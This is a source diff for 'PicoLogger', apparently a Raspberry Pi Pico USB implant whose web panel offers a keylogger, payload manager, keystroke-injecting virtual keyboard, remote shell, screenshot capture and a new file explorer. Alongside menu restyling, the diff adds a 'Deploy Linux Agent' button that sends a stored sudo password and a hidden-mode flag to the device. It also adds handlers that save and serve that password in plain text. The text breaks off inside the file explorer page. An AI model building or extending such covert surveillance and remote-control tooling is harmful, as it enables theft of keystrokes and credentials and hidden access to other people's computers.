@@ -9,9 +9,13 @@ void handleRoot() {
         <title>PicoLogger | Keylogger</title>
         <style>
             body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
-            .top-bar{background:#333;padding:10px 20px;display:flex;justify-content:center;align-items:center;gap:5%}
-            .top-bar a{color:#fff;text-decoration:none;padding:10px 15px;margin:0 5px;border-radius:5px;background:#444;transition:.3s}
-            .top-bar a:hover{background:#666}
+            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
+            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
+            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95); opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
+            .menu-overlay.active { opacity: 1; visibility: visible; }
+            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
+            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
+            .menu-content a:hover { background: #666; }
             .container{width:90%;max-width:1000px;margin:20px auto;background:#222;padding:20px 20px 60px 20px;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1)}
             h2{text-align:center;color:#fc0}
             button{display:block;width:100%;padding:10px;margin-top:10px;background:#fc0;color:#000;border:none;font-size:16px;font-weight:700;border-radius:5px;cursor:pointer;transition:.3s}
@@ -21,16 +25,28 @@ void handleRoot() {
             .footer{text-align:center;color:#fc0;font-size:14px;background:#333;position:fixed;width:100%;bottom:0}
             .footer a{color:#fc0;text-decoration:none;transition:.3s}
         </style>
+        <script>
+        function toggleMenu() {
+            const overlay = document.getElementById("menuOverlay");
+            overlay.classList.toggle("active");
+        }
+        </script>
     </head>
     <body>
-        <div class="top-bar">
-            <a href="/">Keylogger</a>
-            <a href="/payloads">Payload Manager</a>
-            <a href="/keyboard">Virtual Keyboard</a>
-            <a href="/shell">Remote Shell</a>
-            <a href="/screen">Screenshots</a>
-            <a href="/settings">Settings</a>
-        </div>
+          <div class="top-bar">
+              <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
+              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8); backdrop-filter: blur(5px);">
+                  <div class="menu-content">
+                      <a href="/" onclick="toggleMenu()">Keylogger</a>
+                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
+                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
+                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
+                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
+                      <a href="/settings" onclick="toggleMenu()">Settings</a>
+                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
+                  </div>
+              </div>
+          </div>
           <div class="ascii-container" align="center">
             <pre class="ascii-art">
    ___                 _                                  
@@ -70,9 +86,13 @@ void handlePayloadsPage() {
         <title>PicoLogger | Payload Manager</title>
         <style>
             body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
-            .top-bar{background:#333;padding:10px 20px;display:flex;justify-content:center;align-items:center;gap:5%}
-            .top-bar a{color:#fff;text-decoration:none;padding:10px 15px;margin:0 5px;border-radius:5px;background:#444;transition:.3s}
-            .top-bar a:hover{background:#666}
+            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
+            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
+            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95); opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
+            .menu-overlay.active { opacity: 1; visibility: visible; }
+            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
+            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
+            .menu-content a:hover { background: #666; }
             .container{width:90%;max-width:1000px;margin:20px auto;background:#222;padding:20px 20px 60px 20px;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1)}
             h2,h3{text-align:center;color:#fc0}
             input,textarea{box-sizing:border-box;width:100%;padding:10px;margin:10px 0;border-radius:5px;border:none;background:#333;color:#fff}
@@ -96,6 +116,10 @@ void handlePayloadsPage() {
             .footer a{color:#fc0;text-decoration:none;transition:.3s}
         </style>
         <script>
+            function toggleMenu() {
+                const overlay = document.getElementById("menuOverlay");
+                overlay.classList.toggle("active");
+            }
             function loadPayloads() {
                 fetch('/list_payloads')
                 .then(response => response.json())
@@ -188,14 +212,20 @@ void handlePayloadsPage() {
         </script>
     </head>
     <body>
-        <div class="top-bar">
-            <a href="/">Keylogger</a>
-            <a href="/payloads">Payload Manager</a>
-            <a href="/keyboard">Virtual Keyboard</a>
-            <a href="/shell">Remote Shell</a>
-            <a href="/screen">Screenshots</a>
-            <a href="/settings">Settings</a>
-        </div>
+          <div class="top-bar">
+              <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
+              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8); backdrop-filter: blur(5px);">
+                  <div class="menu-content">
+                      <a href="/" onclick="toggleMenu()">Keylogger</a>
+                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
+                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
+                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
+                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
+                      <a href="/settings" onclick="toggleMenu()">Settings</a>
+                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
+                  </div>
+              </div>
+          </div>
 <div class="ascii-container" align="center">
     <pre class="ascii-art">
    ___                 _                                  
@@ -228,6 +258,7 @@ void handlePayloadsPage() {
 
 
 // =========================================== Settings Page ========================================
+
 void handleSettingsPage() {
     String page = R"rawliteral(
     <!DOCTYPE html>
@@ -236,9 +267,13 @@ void handleSettingsPage() {
         <title>PicoLogger | Settings</title>
         <style>
             body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
-            .top-bar{background:#333;padding:10px 20px;display:flex;justify-content:center;align-items:center;gap:5%}
-            .top-bar a{color:#fff;text-decoration:none;padding:10px 15px;margin:0 5px;border-radius:5px;background:#444;transition:.3s}
-            .top-bar a:hover{background:#666}
+            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
+            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
+            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95); opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
+            .menu-overlay.active { opacity: 1; visibility: visible; }
+            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
+            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
+            .menu-content a:hover { background: #666; }
             .container{width:90%;max-width:1000px;margin:20px auto;background:#222;padding:20px 20px 60px 20px;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1)}
             h2,h3{text-align:center;color:#fc0}
             input,textarea{box-sizing:border-box;width:100%;padding:10px;margin:10px 0;border-radius:5px;border:none;background:#333;color:#fff}
@@ -248,6 +283,7 @@ void handleSettingsPage() {
             .switch input{opacity:0;width:0;height:0}
             .slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#ccc;border-radius:20px;transition:.4s}
             .slider:before{position:absolute;content:"";height:14px;width:14px;left:3px;bottom:3px;background-color:#fff;transition:.4s;border-radius:50%}
+            select{box-sizing:border-box;width:100%;padding:10px;margin:10px 0;border-radius:5px;border:none;background:#333;color:#fff;}
             input:checked+.slider{background-color:#fc0}
             input:checked+.slider:before{transform:translateX(14px)}
             .ascii-container{color:#fc0;display:auto;justify-content:center;align-items:center;width:100%;overflow:auto;font-size:14px;font-weight:700}
@@ -256,18 +292,31 @@ void handleSettingsPage() {
             .footer a{color:#fc0;text-decoration:none;transition:.3s}
         </style>
         <script>
+            function toggleMenu() {
+                const overlay = document.getElementById("menuOverlay");
+                overlay.classList.toggle("active");
+            }
             function saveSettings() {
                 const ssid = document.getElementById('ssid').value;
                 const password = document.getElementById('password').value;
-                const wifiState = document.getElementById('wifiState').checked ? 'ON' : 'OFF';              
+                const wifiState = document.getElementById('wifiState').checked ? 'ON' : 'OFF';
+                const layout = document.getElementById('layout').value;
+            
                 fetch('/save_settings', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: `ssid=${encodeURIComponent(ssid)}&password=${encodeURIComponent(password)}&wifiState=${wifiState}`
-                }).then(() => {
-                    alert("Settings saved successfully!");
-                }).catch(err => {
-                    alert("Failed to save settings!");
+                    body: `ssid=${encodeURIComponent(ssid)}&password=${encodeURIComponent(password)}&wifiState=${wifiState}&layout=${layout}`
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert("Settings saved successfully!");
+                    } else {
+                        alert("Failed to save settings! Server responded with status: " + response.status);
+                    }
+                })
+                .catch(err => {
+                    alert("Network error: Failed to save settings!");
+                    console.error("Error:", err);
                 });
             }
             function formatLittleFS() {
@@ -277,6 +326,13 @@ void handleSettingsPage() {
                         .catch(err => alert('Failed to format LittleFS!'));
                 }
             }
+            function rebootPico() {
+                if (confirm('Are you sure you want reboot PicoLogger?')) {
+                    fetch('/reboot_pico', { method: 'POST' })
+                        .then(() => alert('Restarting PicoLogger!'))
+                        .catch();
+                }
+            }
             window.onload = function() {
                 fetch('/load_settings')
                     .then(response => response.json())
@@ -284,19 +340,26 @@ void handleSettingsPage() {
                         document.getElementById('ssid').value = data.ssid;
                         document.getElementById('password').value = data.password;
                         document.getElementById('wifiState').checked = data.wifiState === 'ON';
+                        document.getElementById('layout').value = data.layout || 'us';
                     });
             }
         </script>
     </head>
     <body>
-        <div class="top-bar">
-            <a href="/">Keylogger</a>
-            <a href="/payloads">Payload Manager</a>
-            <a href="/keyboard">Virtual Keyboard</a>
-            <a href="/shell">Remote Shell</a>
-            <a href="/screen">Screenshots</a>
-            <a href="/settings">Settings</a>
-        </div>
+          <div class="top-bar">
+              <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
+              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8); backdrop-filter: blur(5px);">
+                  <div class="menu-content">
+                      <a href="/" onclick="toggleMenu()">Keylogger</a>
+                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
+                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
+                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
+                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
+                      <a href="/settings" onclick="toggleMenu()">Settings</a>
+                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
+                  </div>
+              </div>
+          </div>
         <div class="ascii-container" align="center">
             <pre class="ascii-art">
    ___                 _                                  
@@ -318,6 +381,23 @@ void handleSettingsPage() {
             <div class="input-group">
                 <label for="password">WiFi Password:</label>
                 <input type="text" id="password" placeholder="Enter WiFi Password">
+            </div>        
+            <div class="input-group">
+                <label for="layout">Keyboard Layout:</label>
+                <select id="layout">
+                    <option value="us">US</option>
+                    <option value="fr">French</option>
+                    <option value="de">German</option>
+                    <option value="es">Spanish</option>
+                    <option value="it">Italian</option>
+                    <option value="pt">Portuguese</option>
+                    <option value="fi">Finnish</option>
+                    <option value="be">Belgian</option>
+                    <option value="br">Brazilian</option>
+                    <option value="tr">Turkish</option>\
+                    <option value="dk">Danish</option>
+                    <option value="uk">UK</option>
+                </select>
             </div>
             <div class="input-group">
                 <label for="wifiState">WiFi ON/OFF:</label>
@@ -329,6 +409,7 @@ void handleSettingsPage() {
             </div>
             <button onclick="saveSettings()">Save</button>
             <button onclick="formatLittleFS()" class="warning">Format LittleFS</button>
+            <button onclick="rebootPico()" class="warning">Reboot PicoLogger</button>
         </div>
         <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
     </body>
@@ -346,9 +427,13 @@ void handleKeyboardPage() {
         <title>PicoLogger | Virtual Keyboard</title>
         <style>
             body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
-            .top-bar{background:#333;padding:10px 20px;display:flex;justify-content:center;align-items:center;gap:5%}
-            .top-bar a{color:#fff;text-decoration:none;padding:10px 15px;margin:0 5px;border-radius:5px;background:#444;transition:.3s}
-            .top-bar a:hover{background:#666}
+            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
+            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
+            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95)!important; opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
+            .menu-overlay.active { opacity: 1; visibility: visible; }
+            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
+            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
+            .menu-content a:hover { background: #666; }
             .container{width:90%;max-width:1000px;margin:20px auto;background:#222;padding:20px 20px 40px 20px;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1);text-align:center}
             h2{text-align:center;color:#fc0}
             .keyboard{display:grid;grid-template-columns:repeat(16,1fr);gap:5px;justify-content:center;align-items:center;padding:10px}
@@ -364,6 +449,10 @@ void handleKeyboardPage() {
             .footer a{color:#fc0;text-decoration:none;transition:.3s}
         </style>
         <script>
+            function toggleMenu() {
+                const overlay = document.getElementById("menuOverlay");
+                overlay.classList.toggle("active");
+            }
             let capsLock = false;
             let shiftActive = false;
             let guiActive = false;
@@ -412,14 +501,20 @@ void handleKeyboardPage() {
         </script>
     </head>
     <body>
-        <div class="top-bar">
-            <a href="/">Keylogger</a>
-            <a href="/payloads">Payload Manager</a>
-            <a href="/keyboard">Virtual Keyboard</a>
-            <a href="/shell">Remote Shell</a>
-            <a href="/screen">Screenshots</a>
-            <a href="/settings">Settings</a>
-        </div>
+          <div class="top-bar">
+              <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
+              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8)!important; backdrop-filter: blur(5px);">
+                  <div class="menu-content">
+                      <a href="/" onclick="toggleMenu()">Keylogger</a>
+                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
+                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
+                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
+                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
+                      <a href="/settings" onclick="toggleMenu()">Settings</a>
+                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
+                  </div>
+              </div>
+          </div>
           <div class="ascii-container" align="center">
             <pre class="ascii-art">
    ___                 _                                  
@@ -513,16 +608,20 @@ void handleShell() {
         <title>PicoLogger | Remote Shell</title>
         <style>
             body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
-            .top-bar{background:#333;padding:10px 20px;display:flex;justify-content:center;align-items:center;gap:5%}
-            .top-bar a{color:#fff;text-decoration:none;padding:10px 15px;margin:0 5px;border-radius:5px;background:#444;transition:.3s}
-            .top-bar a:hover{background:#666}
+            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
+            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
+            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95); opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
+            .menu-overlay.active { opacity: 1; visibility: visible; }
+            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
+            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
+            .menu-content a:hover { background: #666; }
             .container{width:90%;max-width:1000px;margin:20px auto;background:#222;padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1);text-align:center}
             h2{text-align:center;color:#fc0}
             textarea{box-sizing:border-box;width:100%;height:250px;padding:10px;border-radius:5px;border:none;background:#333;color:#fff}
-            input{width:80%;padding:10px;margin:10px 0;border-radius:5px;border:none;background:#333;color:#fff;font-size:16px}
-            button{width:15%;padding:10px;margin-left:5px;background:#fc0;color:#000;border:none;font-size:16px;font-weight:700;border-radius:5px;cursor:pointer;transition:.3s}
+            input{width:70%;padding:10px;margin:10px 0;border-radius:5px;border:none;background:#333;color:#fff;font-size:16px}
+            button{width:20%;padding:10px;margin-left:5px;background:#fc0;color:#000;border:none;font-size:16px;font-weight:700;border-radius:5px;cursor:pointer;transition:.3s;height: 42px;}
             button:hover{background:#fa0}
-            .switch-container{display:flex;justify-content:center;gap:20px;margin:15px 0}
+            .switch-container{display:flex;justify-content:center;gap:10px;margin:10px 0}
             .switch{position:relative;display:inline-block;width:60px;height:34px}
             .switch input{opacity:0;width:0;height:0}
             .slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#444;transition:.4s;border-radius:34px}
@@ -535,6 +634,32 @@ void handleShell() {
             .footer a{color:#fc0;text-decoration:none;transition:.3s}
         </style>
         <script>
+            function toggleMenu() {
+                const overlay = document.getElementById("menuOverlay");
+                overlay.classList.toggle("active");
+            }
+            function loadPassword() {
+                fetch('/get_password')
+                    .then(response => response.text())
+                    .then(password => {
+                        document.getElementById("passwordInput").value = password;
+                    })
+                    .catch(error => console.error('Error loading password:', error));
+            }            
+            function deployBashAgent() {
+                let password = document.getElementById("passwordInput").value;
+                let hiddenMode = document.getElementById("hiddenSwitch").checked ? "1" : "0";
+                fetch('/deploy_linux', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'password=' + encodeURIComponent(password) + '&hidden=' + hiddenMode
+                })
+                .then(response => response.text())
+                .then(output => {
+                    alert(output);
+                })
+                .catch(error => console.error('Error deploying bash agent:', error));
+            }
             function deployAgent() {
                 let adminMode = document.getElementById("adminSwitch").checked ? "1" : "0";
                 let hiddenMode = document.getElementById("hiddenSwitch").checked ? "1" : "0";
@@ -566,6 +691,7 @@ void handleShell() {
                 })
                 .catch(error => console.error('Error executing command:', error));
             }
+            document.addEventListener("DOMContentLoaded", loadPassword);
             document.addEventListener("DOMContentLoaded", function() {
                 document.getElementById("commandInput").addEventListener("keypress", function(event) {
                     if (event.key === "Enter") {
@@ -577,14 +703,20 @@ void handleShell() {
         </script>
     </head>
     <body>
-        <div class="top-bar">
-            <a href="/">Keylogger</a>
-            <a href="/payloads">Payload Manager</a>
-            <a href="/keyboard">Virtual Keyboard</a>
-            <a href="/shell">Remote Shell</a>
-            <a href="/screen">Screenshots</a>
-            <a href="/settings">Settings</a>
-        </div>
+          <div class="top-bar">
+              <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
+              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8); backdrop-filter: blur(5px);">
+                  <div class="menu-content">
+                      <a href="/" onclick="toggleMenu()">Keylogger</a>
+                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
+                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
+                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
+                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
+                      <a href="/settings" onclick="toggleMenu()">Settings</a>
+                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
+                  </div>
+              </div>
+          </div>
           <div class="ascii-container" align="center">
             <pre class="ascii-art">
    ___                 _                                  
@@ -615,7 +747,11 @@ void handleShell() {
                         <span class="slider"></span>
                     </label>
                 </label>
-                <button onclick="deployAgent()">Deploy Agent</button>
+                <button onclick="deployAgent()">Deploy Windows Agent</button>
+                <button onclick="deployBashAgent()">Deploy Linux Agent</button>
+                <input type="text" id="passwordInput" placeholder="Enter sudo password..." style="width: 20%;">
+            </div>
+        </div>
         <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
     </body>
     </html>
@@ -623,6 +759,35 @@ void handleShell() {
     server.send(200, "text/html", page);
 }
 
+void handleUpdatePassword() {
+    if (server.hasArg("password")) {
+        String newPassword = server.arg("password");
+        File sudoFile = LittleFS.open("/sudo.txt", "w");
+        if (sudoFile) {
+            sudoFile.println(newPassword);
+            sudoFile.close();
+            server.send(200, "text/plain", "Password updated!");
+        } else {
+            server.send(500, "text/plain", "Error updating password.");
+        }
+    } else {
+        server.send(400, "text/plain", "Password not provided.");
+    }
+}
+
+void handleGetPassword() {
+    String password;
+    File sudoFile = LittleFS.open("/sudo.txt", "r");
+
+    if (sudoFile) {
+        password = sudoFile.readStringUntil('\n');
+        sudoFile.close();
+    } else {
+        password = "";
+    }
+
+    server.send(200, "text/plain", password);
+}
 
 // =========================================================== Screenshot Page =================================================================
 void handleScreenPage() {
@@ -630,16 +795,21 @@ void handleScreenPage() {
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Remote Screenshot</title>
+        <title>PicoLogger | Remote Screenshot</title>
         <style>
             body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
-            .top-bar{background:#333;padding:10px 20px;display:flex;justify-content:center;align-items:center;gap:5%}
-            .top-bar a{color:#fff;text-decoration:none;padding:10px 15px;margin:0 5px;border-radius:5px;background:#444;transition:.3s}
-            .top-bar a:hover{background:#666}
-            .container{margin:20px auto;width:80%;max-width:1000px;padding:20px;background:#222;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1)}
+            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
+            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
+            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95); opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
+            .menu-overlay.active { opacity: 1; visibility: visible; }
+            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
+            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
+            .menu-content a:hover { background: #666; }
+            .container{margin:20px auto;width:80%;align-items: center;max-width:1000px;padding:20px;background:#222;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1)}
+            h2{text-align:center;color:#fc0}
             input,textarea{box-sizing:border-box;width:100%;padding:10px;margin:10px 0;border-radius:5px;border:none;background:#333;color:#fff}
-            img{max-width:100%;border-radius:5px;margin-top:10px;display:none}
-            button{padding:10px 20px;background:#fc0;border:none;font-size:16px;cursor:pointer;border-radius:5px;margin-top:10px}
+            img{width:100%;height:100%;object-fit:cover;border-radius:5px;margin-top:10px;display:block;align-items: center;}
+            button{padding:10px 20px;background:#fc0;color:#000;border:none;font-size:16px;font-weight:700;cursor:pointer;border-radius:5px;margin-top:10px}
             button:hover{background:#fa0}
             .switch-container{display:flex;justify-content:center;gap:20px;margin:15px 0}
             .switch{position:relative;display:inline-block;width:60px;height:34px}
@@ -654,6 +824,10 @@ void handleScreenPage() {
             .footer a{color:#fc0;text-decoration:none;transition:.3s}
         </style>
         <script>
+            function toggleMenu() {
+                const overlay = document.getElementById("menuOverlay");
+                overlay.classList.toggle("active");
+            }
             function deployAgent() {
                 let hiddenMode = document.getElementById("hiddenSwitch").checked ? "1" : "0";
                 let q = document.getElementById("qualityInput").value;
@@ -689,14 +863,20 @@ void handleScreenPage() {
         </script>
     </head>
     <body>
-        <div class="top-bar">
-            <a href="/">Keylogger</a>
-            <a href="/payloads">Payload Manager</a>
-            <a href="/keyboard">Virtual Keyboard</a>
-            <a href="/shell">Remote Shell</a>
-            <a href="/screen">Screenshots</a>
-            <a href="/settings">Settings</a>
-        </div>
+          <div class="top-bar">
+              <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
+              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8); backdrop-filter: blur(5px);">
+                  <div class="menu-content">
+                      <a href="/" onclick="toggleMenu()">Keylogger</a>
+                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
+                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
+                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
+                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
+                      <a href="/settings" onclick="toggleMenu()">Settings</a>
+                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
+                  </div>
+              </div>
+          </div>
           <div class="ascii-container" align="center">
             <pre class="ascii-art">
    ___                 _                                  
@@ -713,7 +893,9 @@ void handleScreenPage() {
             <h2>Remote Screenshot</h2>
             <button onclick="takeScreenshot()">Take Screenshot</button>
             <br><br>
-            <img id="screenshot" src="/screenshot.jpg" alt="No screenshot available">
+            <div align="center" style="width: 100%; height: 100%; overflow: hidden;">
+                <img id="screenshot" src="/screenshot.jpg" alt="No screenshot available">
+            </div>
             <br>
             <div class="switch-container">
                 <label>Quality (1-100)
@@ -737,4 +919,157 @@ void handleScreenPage() {
     </html>
     )rawliteral";
     server.send(200, "text/html", page);
+}
+
+String generateBreadcrumb(String path) {
+    if (path == "/") return "/";
+
+    String breadcrumb = "<a class='folder-link' href='/explorer?path=/'>/</a>";
+    int start = 1;
+    while (true) {
+        int end = path.indexOf('/', start);
+        if (end == -1) break;
+
+        String subPath = path.substring(0, end);
+        String dirName = path.substring(start, end);
+        breadcrumb += "<a class='folder-link' href='/explorer?path=" + subPath + "'>" + dirName + "/</a>";
+        start = end + 1;
+    }
+
+    if (start < path.length()) {
+        String subPath = path;
+        String dirName = path.substring(start);
+        breadcrumb += "<a class='folder-link' href='/explorer?path=" + subPath + "'>" + dirName + "</a>";
+    }
+
+    return breadcrumb;
+}
+
+void handleFileExplorer() {
+    String path = server.hasArg("path") ? server.arg("path") : "/";
+    if (path == "") path = "/";
+
+    String html = R"rawliteral(
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>PicoLogger | File Explorer</title>
+        <style>
+            body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
+            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
+            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
+            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95); opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
+            .menu-overlay.active { opacity: 1; visibility: visible; }
+            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
+            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
+            .menu-content a:hover { background: #666; }
+            .container{width:90%;max-width:1000px;margin:20px auto;background:#222;padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1);text-align:center}
+            h2{text-align:center;color:#fc0}
+            table{width:100%;border-collapse:collapse;margin:10px 0}
+            th, td{padding:10px;text-align:left;background:#333;color:#fff}
+            th{background:#444}
+            tr:hover{background:#555}
+            button{padding:5px 10px;margin:2px;background:#fc0;color:#000;border:none;border-radius:5px;cursor:pointer;transition:.3s}
+            button:hover{background:#fa0}
+            a.folder-link{color:#fc0;text-decoration:none;font-weight:bold}
+            a.folder-link:hover{text-decoration:underline}
+            .breadcrumb{margin:10px 0;color:#fc0;font-weight:bold}
+            .ascii-container{color:#fc0;display:auto;justify-content:center;align-items:center;width:100%;overflow:auto;font-size:14px;font-weight:700}
+            .ascii-art{background:0 0;border:none;padding:0;font-size:14px;font-weight:700;color:#fc0;text-align:center}
+            .footer{text-align:center;color:#fc0;font-size:14px;background:#333;position:fixed;width:100%;bottom:0}
+            .footer a{color:#fc0;text-decoration:none;transition:.3s}
+        </style>
+        <script>
+            function toggleMenu() {
+                const overlay = document.getElementById("menuOverlay");
+                overlay.classList.toggle("active");
+            }
+            function confirmDelete(filePath) {
+                if (confirm("Are you sure you want to delete this file?")) {
+                    location.href = '/delete?file=' + encodeURIComponent(filePath);
+                }
+            }
+        </script>
+    </head>
+    <body>
+          <div class="top-bar">
+              <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
+              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8); backdrop-filter: blur(5px);">
+                  <div class="menu-content">
+                      <a href="/" onclick="toggleMenu()">Keylogger</a>
+                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
+                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
+                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
+                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
+                      <a href="/settings" onclick="toggleMenu()">Settings</a>
